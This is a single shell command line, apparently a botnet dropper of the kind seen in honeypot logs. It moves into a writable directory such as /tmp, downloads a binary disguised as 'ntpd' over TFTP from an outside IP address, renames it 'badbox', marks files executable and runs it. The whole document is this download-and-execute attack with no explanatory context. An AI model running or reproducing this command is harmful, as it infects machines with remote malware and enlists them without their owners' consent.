cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 23.227.178.50 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
